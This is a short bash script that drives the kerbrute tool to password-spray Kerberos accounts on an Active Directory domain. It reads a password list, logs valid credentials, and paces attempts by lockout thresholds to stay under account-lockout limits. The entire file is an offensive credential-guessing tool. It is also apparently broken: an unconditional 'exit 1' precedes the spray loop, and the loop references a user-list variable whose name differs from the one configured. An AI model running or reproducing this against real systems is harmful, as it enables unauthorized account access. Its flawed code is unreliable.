#!/bin/bash
source ./helpMenu.sh
source ./calculateDelay.sh

# Variables for the output name.
OUTPUT_FILE="results_passwordspray_${DOMAIN}_$(date +%Y%m%d_%H%M%S).txt"

COUNTER=1
# Displaying the configuration
echo "User list file: ${USERLIST}"
echo "Password list file: ${PASSWORDLIST}"
echo "Lockout threshold: ${LOCKOUT_THRESHOLD}"
echo "Safe lockout threshold: ${LOCKOUT_THRESHOLD_SAFE}"
echo "Lockout reset time: ${LOCKOUT_RESET_TIME_MIN} minutes"
echo "Number of users: ${NUM_USERS}"
echo "Number of passwords: ${NUM_PASSWORDS}"
echo "Calculated delay between attempts: ${DELAY} seconds"

exit 1

while IFS= read -r LINE
do
        echo "Testing line: ${COUNTER} with the password: ${LINE}"
        ./kerbrute_linux_amd64 passwordspray ${USERSLIST} ${LINE} -d ${DOMAIN} --dc ${DC_IP} -t ${THREADS:-15} | grep -Ei "VALID" | tee -a ${OUTPUT_FILE}
        COUNTER=$((COUNTER+1))
        echo ""
        echo ""
        
done < "${PASSWORDLIST}"